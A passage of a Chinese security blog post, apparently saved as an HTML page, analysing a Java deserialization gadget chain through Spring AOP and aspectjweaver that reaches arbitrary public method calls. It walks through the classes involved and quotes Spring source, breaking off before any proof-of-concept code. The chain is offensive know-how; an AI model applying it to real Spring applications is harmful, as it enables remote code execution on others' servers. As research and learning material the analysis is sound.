@@ -1,0 +1,1562 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Java反序列化调用链之SpringAOP链">
+<title>SpringAOP链</title>
+
+<link rel='canonical' href='https://fupanc-w1n.github.io/p/springaop%E9%93%BE/'>
+
+<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="SpringAOP链">
+<meta property='og:description' content="Java反序列化调用链之SpringAOP链">
+<meta property='og:url' content='https://fupanc-w1n.github.io/p/springaop%E9%93%BE/'>
+<meta property='og:site_name' content='fupanc'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-27T22:53:06&#43;08:00'/><meta property='article:modified_time' content='2025-03-27T22:53:06&#43;08:00'/>
+<meta name="twitter:title" content="SpringAOP链">
+<meta name="twitter:description" content="Java反序列化调用链之SpringAOP链">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fupanc</a></h1>
+            <h2 class="site-description">我与我周旋久，宁做我</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fupanc-w1n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#调试分析">调试分析</a></li>
+    <li><a href="#poc构造">POC构造</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#链子一">链子一</a></li>
+            <li><a href="#链子二">链子二</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Java安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/springaop%E9%93%BE/">SpringAOP链</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Java反序列化调用链之SpringAOP链
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-03-27</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="springaop链">SpringAOP链
+</h1><p>SpringAOP，我们在学习rome链时就利用到了这个依赖的HotSwappableTargetSource类，从而可以调用到任意类的equals()方法并控制传递参数。</p>
+<p>但是最近爆出来了一条SpringAOP链，<u>可以调用任意类的无参方法，但是应该必须要public才行</u>，并且这条链子只依赖SpringAOP和aspectjweaver两个依赖包，而springboot中的spring-boot-starter-aop自带包含这俩类，所以其实可以认为在任何springboot里都能打（但是我没找到jdk8下的符合的版本，所以还是用的分开的版本），所以这里使用的依赖项如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--    &amp;lt;!&amp;ndash; https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-aop &amp;ndash;&amp;gt;--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--    &lt;dependency&gt;--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--      &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--      &lt;version&gt;3.4.4&lt;/version&gt;--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--    &lt;/dependency&gt;--&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>spring-aop<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>5.3.19<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.aspectj<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>aspectjweaver<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.9.8<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试环境：</p>
+<ul>
+<li>Jdk8u71</li>
+</ul>
+<p>注意我最开始是用的高版本的，后来才改成低版本，自己区分，但是过程以及代码都是差不多的，也就是说，这条链子在&lt;=jdk17应该也能用，因为jdk17也能调用反射。</p>
+<h2 id="调试分析">调试分析
+</h2><p>这里的sink点存在于org.springframework.aop.aspectj.AbstractAspectJAdvice类的invokeAdviceMethodWithGivenArgs()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429161509544.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429161509544"
+	
+	
+></p>
+<p>这里的this.aspectJAdviceMethod就是一个可控的变量，然后这里的ReflectionUtils.makeAccessible()方法就是判断是否为public，不是的话就会调用setAccessible(true)来设置成可访问：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429164417409.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429164417409"
+	
+	
+></p>
+<p>再回到原来的invokeAdviceMethodWithGivenArgs()方法，后续的重点变量就是aspectInstanceFactory，这个变量调用的getAspectInstance()方法返回值决定了相对应的方法调用的实例，这个变量的类型是AspectInstanceFactory，这是一个接口类，<strong>可以看一下它的实现类的getAspectInstance()方法的返回值是否可以利用，同时需要这个类是实现了Serializable接口</strong>，这样才可以在序列化时利用。</p>
+<p>这里自己找了一下，感觉可以尝试利用LazySingletonAspectInstanceFactoryDecorator类的getAspectInstance()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429165944462.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429165944462"
+	
+	
+></p>
+<p>这里涉及到的materialized变量可以通过反射来修改，并且也是实现了Serializable接口，但是在对其他变量的定义还需要找一个类来赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429170245492.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429170245492"
+	
+	
+></p>
+<p>不好利用，再看看其他类，可以发现一个非常好用的类：SingletonAspectInstanceFactory。位于org.springframework.aop.aspectj.SingletonAspectInstanceFactory，关键代码如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429170819756.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429170819756"
+	
+	
+></p>
+<p>非常符合利用条件，可控的参数，可以赋值为任意类，由此可达到方法调用的对应实例的任意赋值。</p>
+<p>回到AbstractAspectJAdvice类，有几个点需要说明：</p>
+<ul>
+<li>这是一个抽象类，所以无法直接实例化利用</li>
+<li>这个类定义了readObejct()方法，在实例化时要保证赋值正确，同时调用的是getMethod()方法，应该只能获取public类型的方法吧：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429171922006.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429171922006"
+	
+	
+></p>
+<p>后续构造时注意一下这里提到的点。</p>
+<p>——————</p>
+<p>继续来看链子，现在就是看可以会调用到AbstractAspectJAdvice类的invokeAdviceMethodWithGivenArgs()方法，同时还可以看哪里会调用到AbstractAspectJAdvice类的invokeAdviceMethod()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429214336187.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429214336187"
+	
+	
+></p>
+<p>从首发的文章的链子来看，这里找到可触发点在AspectJAroundAdvice类的invoke()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429215037955.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429215037955"
+	
+	
+></p>
+<p>看这个类，可以发现这个类的父类是AbstractAspectJAdvice，是public方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429215317504.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429215317504"
+	
+	
+></p>
+<p>再看这个类的invoke()方法，可以看到是实现了调用invokeAdviceMethod()方法，所以这里可以尝试接入前面分析的后续链子，从而达到调用任意类的方法。</p>
+<p>再继续往前找，现在就是想怎么可以触发到这个类的invoke()方法，第一步想到的肯定是通过动态代理来打，但是这个参数传递有点问题，似乎是不能直接打的。<u>那么在看如何调用到这个类的invoke()方法</u>，这里往前找到的方法为ReflectiveMethodInvocation类的proceed()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429215959602.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429215959602"
+	
+	
+></p>
+<p>在方法最后调用了interceptorOrInterceptionAdvice类的invoke()方法，从类的调用来看，可以知道MethodInterceptor类是一个接口类，所以需要interceptorOrInterceptionAdvice实现了MethodInterceptor接口，再看我们想要利用的AspectJAroundAdvice类，可以发现这个类是实现了MethodInterceptor接口的，刚好可以直接利用。现在就是看怎么将我们想要利用的类放进去了，主要的代码逻辑在于：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">		</span><span class="n">Object</span><span class="w"> </span><span class="n">interceptorOrInterceptionAdvice</span><span class="w"> </span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="k">this</span><span class="p">.</span><span class="na">interceptorsAndDynamicMethodMatchers</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="na">currentInterceptorIndex</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里涉及到的两个变量：interceptorsAndDynamicMethodMatchers和currentInterceptorIndex，第一个是list类型，第二个是int类型，并且默认是-1，而第一个变量可以在类初始化时进行赋值，当然，我们还可以通过反射来修改两个变量的值。</p>
+<p>那么现在就是看怎么调用这个类的proceed()方法了，需要注意的是，ReflectiveMethodInvocation类没有实现Serializable接口，所以需要找特别的方法来进行调用，在参考文章中学到一个非常好用且经典的解决方法：<strong>既然我们无法在反序列化过程中使用，那么就只能依赖于动态创建</strong>。</p>
+<p>同时需要注意的是，既然都是<strong>在反序列化过程</strong>中动态创建了，那么是肯定无法通过反射来修改类变量的了。那么现在来认真看一下代码实现逻辑的条件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250429223259219.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250429223259219"
+	
+	
+></p>
+<p>其实<strong>只要interceptorsAndDynamicMethodMatchers的list中有我们想要放进去的AspectJAroundAdvice类实例即可</strong>。原因如下：</p>
+<ul>
+<li>AspectJAroundAdvice类本身以及父类都没有实现InterceptorAndDynamicMethodMatcher类，所以是肯定可以进入到else语句进行预期的invoke()方法调用</li>
+<li>其次只要size()返回的值不为0，也就是至少有一个值就行了，那么这样返回的size-1就不会与-1相同，同时在调用get()获取值时，是<code>++this.currentInterceptorIndex</code>，也就是先+1然后再获取值，这里也就回从-1变成0，从而获取到list中的第一个值。</li>
+</ul>
+<p>综上，我们只要在动态创建ReflectiveMethodInvocation类时能控制构造函数的最后一个参数即可：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503163929840.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503163929840"
+	
+	
+></p>
+<p>继续往上找到的JdkDynamicAopProxy类，这个类有动态创建ReflectiveMethodInvocation的地方：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503164020675.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503164020675"
+	
+	
+></p>
+<p>可以看到在JdkDynamicAopProxy类中有调用，这个类在解决jackson不稳定性的链子也是了解过的，需要反射来创建类实例，跟进相对应的方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503164155909.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503164155909"
+	
+	
+></p>
+<p>发现存在于这个类的invoke()方法中，代码调用过程如上，所以我们这里就是需要控制这个list类型的chain中放有一个AspectJAroundAdvice类实例。</p>
+<p>再看JdkDynamicAopProxy类，这个类是实现了Serializable接口的，所以可以用来序列化，并且这个类的invoke()的参数接收是和基本的动态代理的点是一样的，所以这里可以尝试利用动态代理来进行触发JdkDynamicAopProxy类的invoke()方法。</p>
+<p>现在来关注参数传递，怎么控制这个chain变量，主要是如下几个变量需要控制：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503165737271.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503165737271"
+	
+	
+></p>
+<p>看了一下，这里的advised变量要求必须是AdvisedSupport类型，这个类是public，并且这个类的父类是实现了Serializable接口的，可以直接利用。</p>
+<p>然后这里的targetSource也可以控制，变量赋值情况如下：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503170504864.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503170504864"
+	
+	
+></p>
+<p>直接就是获取这个变量，然后想要控制target的话，还需要注意这个targetSource变量所对应的对象是否有getTarget()方法，跟进这个变量的赋值，变量定义为TargetSource类型，这是一个接口类，所以需要找它的实现类来利用，自己简单找了一下，至少有两个类可以利用：</p>
+<ul>
+<li>一个是AdvisedSupport本类的setTarget()方法：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503170828888.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503170828888"
+	
+	
+></p>
+<p>这里实例化了一个SingletonTargetSource类，跟进情况如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503171025785.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503171025785"
+	
+	
+></p>
+<p>都是object类型，并且方法对应，可以利用。</p>
+<ul>
+<li>另外一个类是HotSwappableTargetSource类：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503171246851.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503171246851"
+	
+	
+></p>
+<p>它的getTarget()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503171306693.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503171306693"
+	
+	
+></p>
+<p>所以也是非常符合的。也许TargetSource接口类的实现类还有，这里不多说了。</p>
+<p>继续看条件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503171506663.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503171506663"
+	
+	
+></p>
+<p>现在的关键就是AdvisedSupport类的getInterceptorsAndDynamicInterceptionAdvice()方法，跟进这个方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503171540477.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503171540477"
+	
+	
+></p>
+<p>再看和这里有关的methodCache变量：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503171718669.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503171718669"
+	
+	
+></p>
+<p>一个Map类型，标注了key和value的类型，这里有一个非常关键的点，<strong>这个变量的定义为transient，导致这个变量不可被序列化</strong>。而这个类的构造方法以及readObject()方法有对这个变量的赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503174957800.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503174957800"
+	
+	
+></p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503172112223.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503172112223"
+	
+	
+></p>
+<p>这个ConcurrentHashMap类其实也是一个Map类型的类，存在put()方法用于放入键值对。</p>
+<p>再仔细看getInterceptorsAndDynamicInterceptionAdvice()方法，由于methodCache变量声明为transient，所以只有在cached的获取肯定为null，那么来看进入if条件的代码，这里会调用advisorChainFactory变量的getInterceptorsAndDynamicInterceptionAdvice()方法，这里的advisorChainFactory变量默认为DefaultAdvisorChainFactory类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503181435439.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503181435439"
+	
+	
+></p>
+<p>所以会调用DefaultAdvisorChainFactory类的getInterceptorsAndDynamicInterceptionAdvice()方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">getInterceptorsAndDynamicInterceptionAdvice</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">Advised</span><span class="w"> </span><span class="n">config</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="nd">@Nullable</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">targetClass</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">// This is somewhat tricky... We have to process introductions first,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">// but we need to preserve order in the ultimate list.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">AdvisorAdapterRegistry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GlobalAdvisorAdapterRegistry</span><span class="p">.</span><span class="na">getInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">Advisor</span><span class="o">[]</span><span class="w"> </span><span class="n">advisors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getAdvisors</span><span class="p">();</span><span class="w">
